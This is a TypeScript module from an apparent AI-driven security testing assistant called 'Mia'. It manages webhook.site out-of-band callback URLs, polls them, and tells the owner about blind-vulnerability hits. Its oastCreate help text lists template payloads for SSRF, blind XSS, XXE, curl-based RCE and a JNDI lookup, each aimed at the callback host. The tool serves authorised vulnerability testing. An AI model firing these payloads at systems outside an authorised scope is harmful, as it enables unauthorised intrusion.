// Out-of-band testing (OAST) — keyless via webhook.site. Lets Mia CONFIRM blind
// bugs (SSRF, blind XSS/XXE/RCE, SQLi-OOB over HTTP) by handing the target a
// unique callback URL and polling what actually hit it.
//
// This module only talks to webhook.site (not the target) — the target is hit by
// the exploit Mia sends via her scoped tools. Per-user token at
// .data/users/<user>/oast.json.
//
// AUTO-WATCH (2026-09-23): a background watcher (`startOastWatcher`, wired in
// instrumentation) polls every OAST_WATCH_MIN (default 5) minutes for every user
// with an ACTIVE token, dedupes against `seen`, attributes new hits to the
// outgoing probe(s) that carried the callback (via http-history), stores them in
// `hits`, and pushes ONE notification to the owner — so a blind-bug callback
// arriving 10 minutes later is never missed just because nobody ran `oast_poll`
// in that turn. `oastPoll` shares the same dedupe so a manual poll and the
// watcher can't double-notify.
import { existsSync, mkdirSync, readFileSync, readdirSync, renameSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { sanitizeUser, userDataRoot, isTestUserKey } from "./users";
import { readHttpHistory, type HttpRecord } from "./httpHistory";
import { alreadyStarted } from "./once";

type Oast = { uuid: string; url: string; createdAt: string };
export type OastHit = { id: string; at: string; method: string; path: string; ip: string; carriers: string[] };
type OastStore = {
  current?: Oast;
  /** ids already surfaced (by watcher or a manual poll) — prevents double-notify. */
  seen?: string[];
  /** recent hits kept for evidence (cap HIT_CAP, newest first). */
  hits?: OastHit[];
};
type WsRequest = { uuid?: string; method?: string; url?: string; ip?: string; created_at?: string; user_agent?: string; headers?: Record<string, string>; content?: string; query?: Record<string, string> };

const SEEN_CAP = 300;
const HIT_CAP = 100;
const ROW_CAP = 50;

function storePath(userKey: string): string {
  return join(userDataRoot(), userKey, "oast.json");
}
function readStore(rawUser: unknown): { userKey: string; store: OastStore } | null {
  const userKey = sanitizeUser(rawUser);
  if (!userKey) return null;
  try {
    const j = JSON.parse(readFileSync(storePath(userKey), "utf8"));
    return { userKey, store: j && typeof j === "object" ? (j as OastStore) : {} };
  } catch {
    return { userKey, store: {} };
  }
}
function writeStore(userKey: string, store: OastStore): void {
  const file = storePath(userKey);
  mkdirSync(dirname(file), { recursive: true });
  const tmp = `${file}.tmp`;
  writeFileSync(tmp, JSON.stringify(store, null, 2));
  renameSync(tmp, file);
}
async function ws<T>(url: string, init?: RequestInit, timeoutMs = 15_000): Promise<T | null> {
  try {
    const res = await fetch(url, { ...init, headers: { "User-Agent": "mia-assistant/1.0", ...(init?.headers || {}) }, signal: AbortSignal.timeout(timeoutMs) });
    if (!res.ok) return null;
    return (await res.json()) as T;
  } catch {
    return null;
  }
}

// ── pure helpers (unit-tested; shared by manual poll + auto watcher) ─────────

/** Stable id for a callback row: webhook.site request uuid, else content-derived. */
export function oastHitId(r: WsRequest): string {
  return r.uuid || `${r.method || "?"}|${r.created_at || ""}|${r.url || ""}`;
}

/** Rows not yet surfaced (dedupe against `seen`). Order preserved. */
export function newHits(rows: WsRequest[], seen: string[]): WsRequest[] {
  const s = new Set(seen);
  return rows.filter((r) => !s.has(oastHitId(r)));
}

/**
 * Which outgoing probe(s) carried this callback token — searched in the user's
 * http-history (the record's url contains the webhook.site uuid, e.g.
 * `http://lab/fetch?url=https://webhook.site/<uuid>`). Newest 3, oldest first.
 * Empty when the payload went out via a non-recorded path (POST body, chain).
 */
export function attributeCarriers(uuid: string, history: HttpRecord[]): HttpRecord[] {
  if (!uuid) return [];
  const hits: HttpRecord[] = [];
  for (let i = history.length - 1; i >= 0 && hits.length < 3; i--) {
    if (history[i].url.includes(uuid)) hits.unshift(history[i]);
  }
  return hits;
}

/** Build a hit record from a webhook.site row (+ attribution). Pure. */
export function toHit(r: WsRequest, carriers: string[]): OastHit {
  const u = (() => { try { return r.url ? new URL(r.url) : null; } catch { return null; } })();
  return {
    id: oastHitId(r),
    at: r.created_at || new Date().toISOString(),
    method: r.method || "?",
    path: u ? `${u.pathname}${u.search}`.slice(0, 300) : String(r.url || "").slice(0, 300),
    ip: r.ip || "?",
    carriers: [...carriers],
  };
}

/** Merge fresh rows into store state: deduped ids, capped seen + hits. Pure. */
export function mergeHits(store: OastStore, fresh: WsRequest[], carriers: string[]): OastStore {
  if (!fresh.length) return store;
  const ids = fresh.map(oastHitId);
  const seen = [...new Set([...(store.seen || []), ...ids])].slice(-SEEN_CAP);
  const newOnes = fresh.map((r) => toHit(r, carriers));
  const known = new Set((store.hits || []).map((h) => h.id));
  const hits = [...newOnes.filter((h) => !known.has(h.id)), ...(store.hits || [])].slice(0, HIT_CAP);
  return { ...store, seen, hits };
}

/**
 * Total hit count from an `oastPoll` reply (the ONLY parser chains/provers may
 * use — the old `/1 request|request diterima/` regex matched no real format, so
 * SSRF-OOB and blind-XSS beacon confirmation silently never fired). Parses the
 * head line `— N hit (…)`; no-hit ("belum ada interaksi (0 hit)"), error and
 * unparsable text all yield 0. Pure — tested.
 */
export function oastHitCount(text: string): number {
  const m = /—\s*(\d+)\s+hit\s*\(/.exec(text);
  return m ? Number(m[1]) : 0;
}

function describeHit(h: OastHit): string {
  const carrier = h.carriers.length ? `\n   kirim via: ${h.carriers.join(" , ")}` : "\n   kirim via: (belum terpetakan — cek http_history)";
  return `• [${h.method}] ${h.at} from ${h.ip} — ${h.path}${carrier}`;
}

// ── fetch helpers ────────────────────────────────────────────────────────────

async function fetchRows(uuid: string): Promise<WsRequest[] | null> {
  const j = await ws<{ total?: number; data?: WsRequest[] }>(`https://webhook.site/token/${uuid}/requests?sorting=newest`, undefined, 20_000);
  if (!j) return null;
  return (j.data || []).slice(0, ROW_CAP);
}

/**
 * Poll + fold a user's token into state (dedupe, attribute, store). Returns
 * `{ fresh }` (rows nobody has seen yet) or null on failure / no token —
 * NEVER throws (watcher contract).
 */
async function pollInto(rawUser: unknown): Promise<{ userKey: string; url: string; fresh: WsRequest[]; store: OastStore } | null> {
  const s = readStore(rawUser);
  if (!s) return null;
  const cur = s.store.current;
  if (!cur) return null;
  const rows = await fetchRows(cur.uuid);
  if (rows === null) return null;
  const fresh = newHits(rows, s.store.seen || []);
  if (fresh.length) {
    const carriers = attributeCarriers(cur.uuid, readHttpHistory(s.userKey)).map((c) => c.url);
    const store = mergeHits(s.store, fresh, carriers);
    writeStore(s.userKey, store);
    return { userKey: s.userKey, url: cur.url, fresh, store };
  }
  return { userKey: s.userKey, url: cur.url, fresh: [], store: s.store };
}

// ── tools ────────────────────────────────────────────────────────────────────

/** Create (or refresh) this user's OAST callback URL. */
export async function oastCreate(rawUser: unknown): Promise<string> {
  const s = readStore(rawUser);
  if (!s) return "Error: invalid user";
  const j = await ws<{ uuid?: string }>("https://webhook.site/token", { method: "POST", headers: { "content-type": "application/json" }, body: "{}" }, 20_000);
  if (!j?.uuid) return "Error: gagal membuat token OAST (webhook.site tidak terjangkau).";
  const url = `https://webhook.site/${j.uuid}`;
  // Fresh token = fresh ledger: old seen/hits belonged to the previous callback.
  writeStore(s.userKey, { current: { uuid: j.uuid, url, createdAt: new Date().toISOString() }, seen: [], hits: [] });
  return [
    `🎣 OAST aktif — callback unik: ${url}`,
    "",
    "Pakai URL ini di payload blind (target harus memanggil balik):",
    `• SSRF: http://target/fetch?url=${url}`,
    `• Blind XSS: <script src="${url}/x.js"></script> atau "><img src=${url}?c=1>`,
    `• XXE: <!ENTITY x SYSTEM "${url}/xxe">`,
    `• RCE/SSTI: curl ${url}/rce ; \${jndi:ldap://...}`,
    "",
    "Kirim payload lewat tool ber-scope (http_request/lab_fetch). Hit didorong OTOMATIS ke channel owner (watcher tiap ~5 menit, teratribusi ke http_history) — `oast_poll` untuk cek manual/instan, `oast_stop` untuk selesai.",
  ].join("\n");
}

/** Poll the callback for anything that hit it. */
export async function oastPoll(rawUser: unknown): Promise<string> {
  const s = readStore(rawUser);
  if (!s) return "Error: invalid user";
  const cur = s.store.current;
  if (!cur) return "Belum ada OAST aktif — jalankan `oast_create` dulu.";
  const p = await pollInto(rawUser);
  if (!p) return `Error: gagal polling ${cur.uuid} (webhook.site tidak terjangkau).`;
  const store = p.store;
  const rows = (store.hits || []).slice(0, 25);
  if (!rows.length) return `🎣 OAST ${cur.url} — belum ada interaksi (0 hit). Kalau target blind, cek lagi nanti / pastikan payload benar-benar terkirim.`;
  const freshCount = p.fresh.length;
  const head = freshCount
    ? `🎣 OAST ${cur.url} — ${rows.length} hit (${freshCount} BARU sejak cek terakhir):`
    : `🎣 OAST ${cur.url} — ${rows.length} hit (tidak ada yang baru):`;
  return [
    head,
    rows.map(describeHit).join("\n"),
    "",
    "⚠️ Hit = bukti OOB. Catat sebagai finding (evidence: request ini) sebelum lapor.",
  ].join("\n");
}

/** Delete the remote token and clear the local pointer. */
export async function oastStop(rawUser: unknown): Promise<string> {
  const s = readStore(rawUser);
  if (!s) return "Error: invalid user";
  const cur = s.store.current;
  if (!cur) return "Tidak ada OAST aktif.";
  await ws(`https://webhook.site/token/${cur.uuid}`, { method: "DELETE" }, 15_000);
  writeStore(s.userKey, {});
  return `🛑 OAST ${cur.uuid} dihapus.`;
}

// ── auto watcher ─────────────────────────────────────────────────────────────

/** Poll every active token ONCE: dedupe, attribute, store; aggregate new hits.
 * Never throws; webhook.site unreachable → reported, no push. Test users are
 * skipped (a verify/probe-seeded token must never poll or push — see the
 * 2026-09-08 overnight-flood lesson). `usersOverride` restricts discovery to an
 * explicit list (verify/tests: exercises the path without touching real tokens). */
export async function runOastTick(usersOverride?: string[]): Promise<string> {
  let users: string[] = [];
  if (usersOverride) {
    // Explicit list (verify/tests) — discovery skipped, test keys still filtered.
    users = usersOverride.filter((u) => !isTestUserKey(u));
  } else {
    try {
      users = readdirSync(userDataRoot(), { withFileTypes: true })
        .filter((d) => d.isDirectory() && !isTestUserKey(d.name) && existsSync(join(userDataRoot(), d.name, "oast.json")))
        .map((d) => d.name);
    } catch {
      return "oast-watch: no user root";
    }
  }
  if (!users.length) return "oast-watch: no active tokens";
  const summaries: string[] = [];
  const pushLines: string[] = [];
  for (const u of users) {
    try {
      const p = await pollInto(u);
      if (!p) continue;
      if (!p.fresh.length) continue;
      const carriers = [...new Set((p.store.hits || []).flatMap((h) => h.carriers))].slice(0, 3);
      const lines = (p.store.hits || []).slice(0, p.fresh.length).map(describeHit);
      summaries.push(`${u}: ${p.fresh.length} hit baru`);
      pushLines.push(`🎯 ${p.url}${carriers.length ? `\n(kirim via: ${carriers.join(" , ")})` : ""}\n${lines.join("\n")}`);
    } catch (e) {
      summaries.push(`${u}: error ${e instanceof Error ? e.message : String(e)}`);
    }
  }
  if (!pushLines.length) return `oast-watch: ${users.length} token dipoll, 0 hit baru`;
  const msg = `🔔 OAST — callback kena!\n${pushLines.join("\n")}\n\nIni bukti out-of-band: jalankan \`poc_verify\` (replay) lalu \`finding_add\` dengan evidence di atas.`;
  try {
    const { pushToOwner } = await import("../channels/pushTarget");
    await pushToOwner(msg);
  } catch { /* channel not up — hits are still stored for oast_poll */ }
  try {
    const { logInfo } = await import("./appLogger");
    logInfo("oast-watch", summaries.join("; "));
  } catch { /* logging best-effort */ }
  return `oast-watch: ${summaries.join("; ")}`;
}

let oastTimer: NodeJS.Timeout | null = null;
let oastRunning = false;

/** Start the OAST auto-watcher (OAST_WATCH_MIN, default 5; 0 = off).
 * Idempotent via the process-wide `once` guard (HMR-safe). */
export function startOastWatcher(): void {
  if (alreadyStarted("oast-watch")) return;
  const min = Number(process.env.OAST_WATCH_MIN);
  const everyMs = (Number.isFinite(min) && min >= 0 ? min : 5) * 60_000;
  if (everyMs === 0) return; // explicitly disabled
  const run = async () => {
    if (oastRunning) return;
    oastRunning = true;
    try {
      await runOastTick();
    } catch (e) {
      try {
        const { logError } = await import("./appLogger");
        logError("oast-watch", `tick error: ${e instanceof Error ? e.message : String(e)}`);
      } catch { /* ignore */ }
    } finally {
      oastRunning = false;
    }
  };
  setTimeout(run, 60_000); // warmup: bots + first probes register first
  oastTimer = setInterval(run, everyMs);
  if (typeof (oastTimer as unknown as { unref?: () => void }).unref === "function") (oastTimer as unknown as { unref: () => void }).unref!();
  void import("./appLogger").then((m) => m.logInfo("oast-watch", `starting — every ${everyMs / 60_000}m`)).catch(() => { /* logging best-effort */ });
}

export function stopOastWatcher(): void {
  if (oastTimer) {
    clearInterval(oastTimer);
    oastTimer = null;
  }
}
